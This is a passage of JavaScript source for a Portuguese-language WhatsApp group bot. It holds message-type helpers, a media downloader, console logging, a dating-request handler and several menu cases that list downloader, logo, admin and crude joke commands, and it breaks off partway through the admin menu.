var PR_String = Procurar_String.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
const downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = mime.split('/')[0].replace('application', 'document') ? mime.split('/')[0].replace('application', 'document') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
filedesbug = `${Math.floor(Math.random() * 9999)}`
trueFileName = attachExtension ? (filedesbug + '.' + type.ext) : filename
// save to file
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
} 
const messagesC = PR_String.slice(0).trim().split(/ +/).shift().toLowerCase();

const exportion = JSON.parse(fs.readFileSync('./exportion.json'))

//THE SOLDIER KING 
//

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const isRegistradoRemetente = sender ? isRegistrado(sender) : false;
const isregistrador = sender ? isRegistrado(sender) : true;
const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	


const isBanchat = isGroup ? dataGp[0].bangp : undefined
const isModobn =  isGroup ? modobn.includes(from) : true



const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const ADVT = isGroup ? dataGp[0].advertir: false
//_-_-_-_-_-_-_-_-_-_-_-_-(SISTEMA GRUPO)_-_-_-_-_-_-_-_-_-_-_-_-_-_-_--\\
const ADVT2 = isGroup ? dataGp[0].advertir2: false
const IS_DELETE = nescessario.Odelete
const isSimi2 = isGroup ? samih2.includes(from) : false

const isAntifake = isGroup ? antifake.includes(from) : false



const isAntiPorn = isGroup ? antiporn.includes(from) : true

const menc_jid = args?.join(" ").replace("@", "") + "@s.whatsapp.net"

const isSimi = isGroup ? simih.includes(from) : false

const sender_ou_n = q.includes("@") ? menc_jid : sender


const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? amy.sendMessage(from, {text: teks.trim(), mentions: memberr}) : amy.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const date = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00" && time2 < "05:00:00"){
var tempo = 'Boa madrugada'
} if(time2 > "05:00:00" && time2 < "12:00:00"){
var tempo = 'Bom dia'
} if(time2 > "12:00:00" && time2 < "18:00:00"){
var tempo = 'Boa tarde'
} if(time2 > "18:00:00"){
var tempo = 'Boa noite'
}

const menc_prt = info.message?.extendedTextMessage?.contextInfo?.participant

//╸╸╸╸╸╸╸╸╸╸╸╸╸ 𝙎𝙀𝙇𝙊𝙎 ╸╸╸╸╸╸╸╸╸╸╸╸
const live = {key : {participant : '0@s.whatsapp.net'},message: {liveproductMessage: {}}} 
const imgm = {key : {participant : '0@s.whatsapp.net'},message: {imageMessage: {}}}
const vid = {key : {participant : '0@s.whatsapp.net'},message: {videoMessage: {}}}
const contato = {key : {participant : '0@s.whatsapp.net'},message: {contactMessage:{displayName: `${pushname}`}}}
const doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage:{}}}


const menc_os2 = q.includes("@") ? menc_jid : menc_prt 
//╸╸╸╸╸╸╸╸╸╸╸╸ 𝘾𝙊𝙉𝙎𝙊𝙇𝙀 ╸╸╸╸╸╸╸╸╸╸╸╸╸
 if (!isGroup && isCmd) console.log(
color(`𝑪𝑶𝑴𝑨𝑵𝑫𝑶 𝑵𝑶 𝑷𝑹𝑰𝑽𝑨𝑫𝑶`,'white'),'\n',
color('➢ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑩𝑶𝑻:','white'),color(botName, 'cyan'),'\n',
color('➢ 𝑼𝑺𝑼𝑨́𝑹𝑰𝑶:','white'),color(pushname,'cyan'),'\n',
color('➢ 𝑪𝑶𝑴𝑨𝑵𝑫𝑶:','white'),color(budy, 'cyan'),'\n',
color('➢ 𝑯𝑶𝑹𝑨́𝑹𝑰𝑶:','white'),color(hora,'cyan'),'\n',
color('⪼ 𝑫𝑨𝑻𝑨:','white'),color(data,'cyan'),'\n')

if (!isCmd && !isGroup) console.log(
color(`𝑪𝑶𝑴𝑨𝑵𝑫𝑶𝑺 𝑬𝑴 𝑮𝑹𝑼𝑷𝑶`,'white'),'\n',
color('➢ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑩𝑶𝑻:','white'),color(botName, 'cyan'),'\n',
color('➢ 𝑼𝑺𝑼𝑨́𝑹𝑰𝑶:','white'),color(pushname,'cyan'),'\n',
color('➢ 𝑴𝑬𝑵𝑺𝑨𝑮𝑬𝑴:','white'),color(budy,'cyan'),'\n',
color('➢ 𝑯𝑶𝑹𝑨́𝑹𝑰𝑶:','white'),color(hora,'cyan'),'\n',
color('➢ 𝑫𝑨𝑻𝑨:','white'),color(data,'cyan'),'\n')

if (isCmd && isGroup) console.log(
color(`𝑪𝑶𝑴𝑨𝑵𝑫𝑶𝑺 𝑬𝑴 𝑮𝑹𝑼𝑷𝑶`,'white'),'\n',
color('➢ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑩𝑶𝑻:','white'),color(botName, 'cyan'),'\n',
color('➢ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑮𝑹𝑼𝑷𝑶:','white'),color(groupName,'cyan'),'\n',
color('➢ 𝑼𝑺𝑼𝑨́𝑹𝑰𝑶:','white'),color(pushname,'cyan'),'\n',
color('➢ 𝑪𝑶𝑴𝑨𝑵𝑫𝑶:','white'),color(budy,'cyan'),'\n',
color('➢ 𝑯𝑶𝑹𝑨́𝑹𝑰𝑶:','white'),color(hora,'cyan'),'\n',
color('➢ 𝑫𝑨𝑻𝑨:','white'),color(data,'cyan'),'\n')

if (!isCmd && isGroup) console.log(
color(`𝑪𝑶𝑴𝑨𝑵𝑫𝑶𝑺 𝑬𝑴 𝑮𝑹𝑼𝑷𝑶`,'white'),'\n',
color('➢ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑩𝑶𝑻:','white'),color(botName, 'cyan'),'\n',
color('➢ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑮𝑹𝑼𝑷𝑶:','white'),color(groupName,'cyan'),'\n',
color('➢ 𝑼𝑺𝑼𝑨́𝑹𝑰𝑶:','white'),color(pushname,'cyan'),'\n',
color('➢ 𝑴𝑬𝑵𝑺𝑨𝑮𝑬𝑴:','white'),color(budy,'cyan'),'\n',
color('➢ 𝑯𝑶𝑹𝑨́𝑹𝑰𝑶:','white'),color(hora,'cyan'),'\n',
color('➢ 𝑫𝑨𝑻𝑨:','white'),color(data,'cyan'),'\n')

//╸╸╸╸╸╸╸╸╸╸ 𝙈𝙀𝙉𝙎𝘼𝙂𝙀𝙉𝙎 ╸╸╸╸╸╸╸╸╸
msg = {
registro: `Voce nao esta registrado!\nPor favor digite ${prefix}login`,
botadm:`${tempo} eu preciso ser administrador para executar este comando `,
aguarde: "Aguarde um pouquinho",
dono: "Lamento lhe informar, mais somente o meu dono pode usar esse comando",
grupo: `Nao e possível usar este comando no pv, somente em grupos`,
private: "So pode ser usado nao?eu pv",
premium: "Você nao e um usuário premium",
adm: "Só pode ser usado por um administrador do grupo",
erro: "Ocorreu uma falha no comando por favor aguarde ate meu dono ajeita", 
modobn: `Precisa ativar o modogamer no grupo use o comando ${prefix}modogame 1 *`, 
}
//╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸


const namoro1 = JSON.parse(fs.readFileSync("./database/func/namoro1.json"))
const namoro2 = JSON.parse(fs.readFileSync("./database/func/namoro2.json"))

// 𖡜ꦽ̸ོ˚￫  🇦  🇨  🇪  🇮  🇹  🇦  🇷 
if(budy.toLowerCase() === "s" || budy.toLowerCase() === "sim") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(namoro2[C14].pedido + "@s.whatsapp.net")
namoro1[C12].namorados = true
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro1.push({usu1: sender, usu2: namoro2[C14].pedido, namorados: true, idgp: from, hora: hora, data: date})
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))
mention(`🥳 Felicitações @${namoro1[C12].usu1.split('@')[0]}! O (a) seu grande amor, @${sender.split('@')[0]}, aceitou o seu pedido de namoro.\nSeu par pode ser consultado no comando: ${prefix}minhadupla`)
}
}

// 𖡜ꦽ̸ོ˚￫  🇷  🇪  🇨  🇺  🇸  🇦  🇷 
if(budy.toLowerCase() === "n" || budy.toLowerCase().replace("ã", "a") === "nao") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(`${namoro2[C14].pedido}@s.whatsapp.net`)
mention(`Sinto muito @${namoro1[C12].usu1.split('@')[0]}! O (a) @${sender.split('@')[0]} não te ama, deve está confuso(a) ou não preparado(a) e por isso não aceitou o seu pedido de namoro. 😦`)
namoro1.splice(C12, 1)
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))
}
}





switch(comando) {

//╸╸╸╸╸╸╸╸╸╸╸╸╸ 𝘾𝘼𝙎𝙀 𝙈𝙀𝙉𝙐 ╸╸╸╸╸╸╸╸╸╸╸╸

case 'menu2':
case 'menu2':
reagir(from,"💗")
try {
let resultmenu = await prepareWAMessageMedia({ image: {url: "https://i.imgur.com/Y09p9dO.jpeg"} }, { upload: amy.waUploadToServer });

amy.relayMessage(from, {
"interactiveMessage": {
"carouselMessage": {
"cards": [
{
"header": {
"title": `╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}    MEMBRO 
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}ᛃ USER⧽ ${pushname}
┃${prefix}ᛃ DONO⧽ ${donoName}
┃${prefix}ᛃ PREFIXO⧽ ${prefix} 
┃${prefix}ᛃ DATA⧽ ${data}
┃${prefix}ᛃ HORA⧽ ${hora}
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}         MENU 
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}criador
┃${prefix}igstalk
┃${prefix}metadinha
┃${prefix}figurinhas [ 40 ]
┃${prefix}arma [ nome ]
┃${prefix}calcular [ 2+9 ]
┃${prefix}ping
┃${prefix}perfil
┃${prefix}imagens
┃${prefix}brasileirao
┃${prefix}gerarlink
┃${prefix}suicidio [ autoban ]
┃${prefix}fazernick [ nome ]
┃${prefix}rankativo
┃${prefix}correio 
┃${prefix}fakechat
┃${prefix}letra [ nome ]
┃${prefix}toimg
┃${prefix}imagepralink
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}      REPORT
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}report
┃${prefix}novocmd
┃${prefix}suporte`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"ᴀᴍʏ ʙᴏᴛ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
},
{
"header": {
"title": `╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}       LOGO 1 TXT
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}angelwing
┃${prefix}blackpink
┃${prefix}girlmascote
┃${prefix}logogame
┃${prefix}fpsmascote
┃${prefix}equipemascote 
┃${prefix}ping
┃${prefix}hackneon
┃${prefix}mascotegame
┃${prefix}ffavatar
┃${prefix}wingeffect
┃${prefix}angelglx 
┃${prefix}gizquadro
┃${prefix}txtquadrinhos
┃${prefix}starballons 
┃${prefix}3dsilver
┃${prefix}frozen 
┃${prefix}goldtext
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}      WALLPAPERS
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}wallvermelho
┃${prefix}wallverde
┃${prefix}wallroxo
┃${prefix}wallrosa
┃${prefix}wallpreto 
┃${prefix}wallmulti
┃${prefix}wallmarrom
┃${prefix}wallllaranja
┃${prefix}walldark
┃${prefix}wallcinza
┃${prefix}wallciano 
┃${prefix}walllbranco`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"ᴀᴍʏ ʙᴏᴛ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
}, 
{
"header": {
"title": `┃${prefix}walllbranco
┃${prefix}wallazulclaro
┃${prefix}wallazul 
┃${prefix}wallamarelo
┃${prefix}wall4k 
┃${prefix}wallanime
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}       DOWNLOADS
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}play
┃${prefix}play2
┃${prefix}play3
┃${prefix}play4
┃${prefix}play5
┃${prefix}play6 
┃${prefix}playmix
┃${prefix}play_video
┃${prefix}playvideo
┃${prefix}playmeme
┃${prefix}pinterest
┃${prefix}pinterest2 
┃${prefix}kwai_mp4
┃${prefix}kwai_mp3
┃${prefix}tiktok_video 
┃${prefix}tiktok_audio
┃${prefix}face_video 
┃${prefix}face_audio
┃${prefix}capcut
┃${prefix}insta_video
┃${prefix}insta_audio
┃${prefix}ytmp4
┃${prefix}ytmp3 
┃${prefix}mememp3
┃${prefix}mediafire
┃${prefix}download-link  
┃${prefix}url`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"ᴀᴍʏ ʙᴏᴛ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
},
{
"header": {
"title":`╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}      EFEITOS IMG
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}affect
┃${prefix}comunismo
┃${prefix}mms
┃${prefix}bobross
┃${prefix}bolsonaro
┃${prefix}blur 
┃${prefix}karaba
┃${prefix}reautiful
┃${prefix}circle
┃${prefix}del
┃${prefix}invert
┃${prefix}facepalm 
┃${prefix}jail
┃${prefix}rip
┃${prefix}pixelate 
┃${prefix}trash
┃${prefix}merda 
┃${prefix}borrar
┃${prefix}hitler
┃${prefix}procurado
┃${prefix}deletem
┃${prefix}preso
┃${prefix}morto 
┃${prefix}lgbt
┃${prefix}lixo
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}           DONO
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}rmv-perfil  
┃${prefix}nome-perfil  
┃${prefix}recado
┃${prefix}perfil-bot   
┃${prefix}reiniciar`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title":  ``,
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"ᴀᴍʏ ʙᴏᴛ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
},
{
"header": {
"title": `┃${prefix}index-bot  
┃${prefix}getcase
┃${prefix}get
┃${prefix}apagar
┃${prefix}entrar
┃${prefix}cases 
┃${prefix}nuke
┃${prefix}listagp
┃${prefix}sairdogp
┃${prefix}listavip
┃${prefix}delvip
┃${prefix}addvip 
┃${prefix}servip
┃${prefix}unbangp
┃${prefix}bangp 
┃${prefix}sermembro
┃${prefix}seradm 
┃${prefix}prefixo-bot 
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃${prefix}     ADMINISTRAÇÃO
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}marcar
┃${prefix}rmfotogp
┃${prefix}fotogp
┃${prefix}linkgp
┃${prefix}status 
┃${prefix}idgp
┃${prefix}descgp
┃${prefix}nomegp
┃${prefix}roletarussa
┃${prefix}limpar
┃${prefix}banf
┃${prefix}ban
┃${prefix}mute
┃${prefix}marcarwa 
┃${prefix}totag`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"ᴀᴍʏ ʙᴏᴛ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
}
]
}
}
},{
});
} catch(e) {
reagir(from,"❌")
}
break
  



case 'cariflex': case 'Cariflex':
reply("O menu foi enviado no seu pv")
try {
amy.sendMessage(sender, {image: {url: `https://i.imgur.com/pwU0RSI.jpeg`}, caption: `╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃          CARIFLEX
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}key 
┃${prefix}users
╭╸╸╸╸╸╸╸╸╸╸╸╸╮
┃        CASES API
╰╸╸╸╸╸╸╸╸╸╸╸╸╯
┃${prefix}baixadores
┃${prefix}montagens
┃${prefix}puxadas
┃${prefix}pesquisa
┃${prefix}hentais
┃${prefix}edits
┃${prefix}animes
┃${prefix}ais/gpts
┃${prefix}calcular [ 2+9 ]
┃${prefix}ping
┃${prefix}perfil
┃${prefix}imagens
┃${prefix}brasileirao
┃${prefix}gerarlink
┃${prefix}suicidio [ autoban ]
┃${prefix}fazernick [ nome ]
┃${prefix}rankativo
┃${prefix}correio 
┃${prefix}fakechat
┃${prefix}letra [ nome ]
┃${prefix}toimg
┃${prefix}pensador
┃${prefix}imagepralink
╰╸╸╸╸╸╸╸╸╸╸╸╸╯`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menu':
await amy.sendMessage(
from,
{image: 
{url: `https://files.catbox.moe/0mhilb.jpg`}, 
caption: `
╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
       𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨${prefix}menuplay
┃❐𖥨${prefix}menuefeitos
┃❐𖥨${prefix}menudono
┃❐𖥨${prefix}brincadeiras
┃❐𖥨${prefix}menuadm
┃❐𖥨${prefix}menuanime
┃❐𖥨${prefix}menulogo
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨${prefix}perfil
┃❐𖥨${prefix}caluladora
┃❐𖥨${prefix}letra
┃❐𖥨${prefix}criador
┃❐𖥨${prefix}suporte
┃❐𖥨${prefix}rankativo
┃❐𖥨${prefix}metadinha
┃❐𖥨${prefix}s
┃❐𖥨${prefix}figurinhas
┃❐𖥨${prefix}toimg
┃❐𖥨${prefix}hd
┃❐𖥨${prefix}gerarlink
┃❐𖥨${prefix}pinterest
┃❐𖥨${prefix}fakechat
┃❐𖥨${prefix}calendario
┃❐𖥨${prefix}ping
┃❐𖥨${prefix}key
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`, 
quoted : vid})
break

case 'menuplay': case 'Menuplay':
reagir(from,`💖`) 
try {
await amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
             𝐌𝐄𝐍𝐔 𝐏𝐋𝐀𝐘  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨${prefix}play  
┃❐𖥨${prefix}playdl
┃❐𖥨${prefix}play2  
┃❐𖥨${prefix}play3  
┃❐𖥨${prefix}play4  
┃❐𖥨${prefix}play5  
┃❐𖥨${prefix}play6  
┃❐𖥨${prefix}play7  
┃❐𖥨${prefix}playmix  
┃❐𖥨${prefix}play_video  
┃❐𖥨${prefix}playvideo  
┃❐𖥨${prefix}playmeme  
┃❐𖥨${prefix}pinterest  
┃❐𖥨${prefix}pintemp4  
┃❐𖥨${prefix}pintemp3  
┃❐𖥨${prefix}tiktok_video  
┃❐𖥨${prefix}tiktok_audio  
┃❐𖥨${prefix}tiktokmp4  
┃❐𖥨${prefix}tiktokmp3  
┃❐𖥨${prefix}face_video  
┃❐𖥨${prefix}face_audio  
┃❐𖥨${prefix}facemp4  
┃❐𖥨${prefix}facemp3  
┃❐𖥨${prefix}insta_video  
┃❐𖥨${prefix}insta_audio  
┃❐𖥨${prefix}instamp4  
┃❐𖥨${prefix}instamp3  
┃❐𖥨${prefix}spotifymp3  
┃❐𖥨${prefix}ytmp4  
┃❐𖥨${prefix}ytmp3  
┃❐𖥨${prefix}url  
┃❐𖥨${prefix}xvideos  
┃❐𖥨${prefix}videoall  
┃❐𖥨${prefix}audioall  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(error)
}
break 

case 'menulogo': case 'Menulogo':
reagir(from, `💖`) 
try {
await amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
             𝐌𝐄𝐍𝐔 𝐋𝐎𝐆𝐎 
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨${prefix}glitch
┃❐𖥨${prefix}write
┃❐𖥨${prefix}advancedglow  
┃❐𖥨${prefix}typography
┃❐𖥨${prefix}pixelglitch  
┃❐𖥨${prefix}neonglitch  
┃❐𖥨${prefix}flag
┃❐𖥨${prefix}flag3d
┃❐𖥨${prefix}deleting
┃❐𖥨${prefix}blackpink
┃❐𖥨${prefix}glowing
┃❐𖥨${prefix}underwater
┃❐𖥨${prefix}logomaker  
┃❐𖥨${prefix}cartoon
┃❐𖥨${prefix}papercut
┃❐𖥨${prefix}watercolor
┃❐𖥨${prefix}effectclouds  
┃❐𖥨${prefix}blackpinklogo  
┃❐𖥨${prefix}gradient
┃❐𖥨${prefix}summerbeach  
┃❐𖥨${prefix}luxurygold  
┃❐𖥨${prefix}multicoloredneon  
┃❐𖥨${prefix}sandsummer  
┃❐𖥨${prefix}galaxywallpaper  
┃❐𖥨${prefix}1917
┃❐𖥨${prefix}makingneon  
┃❐𖥨${prefix}royal
┃❐𖥨${prefix}freecreate  
┃❐𖥨${prefix}galaxy
┃❐𖥨${prefix}lighteffects  
┃❐𖥨${prefix}darkgreen
┃❐𖥨${prefix}dragonball
┃❐𖥨${prefix}neondevil
┃❐𖥨${prefix}frozen
┃❐𖥨${prefix}wooden3d
┃❐𖥨${prefix}metal3d
┃❐𖥨${prefix}ligatures
┃❐𖥨${prefix}3druby
┃❐𖥨${prefix}sunset 
┃❐𖥨${prefix}hackerneon 
┃❐𖥨${prefix}cemetery 
┃❐𖥨${prefix}halloween 
┃❐𖥨${prefix}horror 
┃❐𖥨${prefix}blood 
┃❐𖥨${prefix}joker 
┃❐𖥨${prefix}clouds 
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(error)
}
break

case 'menuefeitos': case 'efeitos':
reagir(from,`💖`) 
try {
await amy.sendMessage(from,
{image: {url: `https://files.catbox.moe/0mhilb.jpg`},
 caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
       𝐌𝐄𝐍𝐔 𝐄𝐅𝐄𝐈𝐓𝐎𝐒
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨${prefix}affect
┃❐𖥨${prefix}comunismo
┃❐𖥨${prefix}mms
┃❐𖥨${prefix}bobross
┃❐𖥨${prefix}bolsonaro
┃❐𖥨${prefix}blur
┃❐𖥨${prefix}karaba
┃❐𖥨${prefix}reautiful
┃❐𖥨${prefix}circle
┃❐𖥨${prefix}del
┃❐𖥨${prefix}invert
┃❐𖥨${prefix}facepalm
┃❐𖥨${prefix}jail
┃❐𖥨${prefix}rip
┃❐𖥨${prefix}pixelate
┃❐𖥨${prefix}trash
┃❐𖥨${prefix}merda
┃❐𖥨${prefix}borrar
┃❐𖥨${prefix}hitler
┃❐𖥨${prefix}procurado
┃❐𖥨${prefix}deletem
┃❐𖥨${prefix}preso
┃❐𖥨${prefix}morto
┃❐𖥨${prefix}lgbt
┃❐𖥨${prefix}lixo
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`},
 {quoted: live})
} catch (error) {
console.log(e)
}
break 
    
case 'brincadeiras': case 'Brincadeiras':
reagir(from,`💖`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
            𝐀𝐕𝐀𝐋𝐈𝐀𝐂̧𝐎𝐄𝐒
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}chifre  
┃❐𖥨 ${prefix}pau  
┃❐𖥨 ${prefix}gado  
┃❐𖥨 ${prefix}gada  
┃❐𖥨 ${prefix}corno  
┃❐𖥨 ${prefix}corna  
┃❐𖥨 ${prefix}bonita  
┃❐𖥨 ${prefix}bebado  
┃❐𖥨 ${prefix}feio  
┃❐𖥨 ${prefix}vesgo  
┃❐𖥨 ${prefix}gostoso  
┃❐𖥨 ${prefix}gostosa  
┃❐𖥨 ${prefix}infiel  
┃❐𖥨 ${prefix}gay  
┃❐𖥨 ${prefix}fiel  
┃❐𖥨 ${prefix}nazista  
┃❐𖥨 ${prefix}alma-gemeas  
┃❐𖥨 ${prefix}punheteiro  
┃❐𖥨 ${prefix}maconheiro  
┃❐𖥨 ${prefix}maconheira  
┃❐𖥨 ${prefix}pervertido  
┃❐𖥨 ${prefix}dogolpe  
┃❐𖥨 ${prefix}guloso  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
           𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}presentinho  
┃❐𖥨 ${prefix}gadometro  
┃❐𖥨 ${prefix}morte  
┃❐𖥨 ${prefix}chance  
┃❐𖥨 ${prefix}quando  
┃❐𖥨 ${prefix}surubao  
┃❐𖥨 ${prefix}desafio  
┃❐𖥨 ${prefix}eununca  
┃❐𖥨 ${prefix}gf  
┃❐𖥨 ${prefix}tapa  
┃❐𖥨 ${prefix}beijar  
┃❐𖥨 ${prefix}matar  
┃❐𖥨 ${prefix}soco  
┃❐𖥨 ${prefix}chute  
┃❐𖥨 ${prefix}cassino  
┃❐𖥨 ${prefix}suicidio  
┃❐𖥨 ${prefix}namorar  
┃❐𖥨 ${prefix}cancelarpedido  
┃❐𖥨 ${prefix}minhadupla  
┃❐𖥨 ${prefix}terminar  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menuadm': case 'Menuadm':
reagir(from,`💖`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮  
           𝐌𝐄𝐍𝐔 𝐀𝐃𝐌𝐈𝐍/𝐆𝐑𝐔𝐏𝐎  
╰⊰❖᯽♡═•⊰❖⊱•═♡᯽❖⊱╯  

╭⊰❖᯽═♡•⊰❖⊱•♡═᯽❖⊱╮
┃❐𖥨 ${prefix}ban  
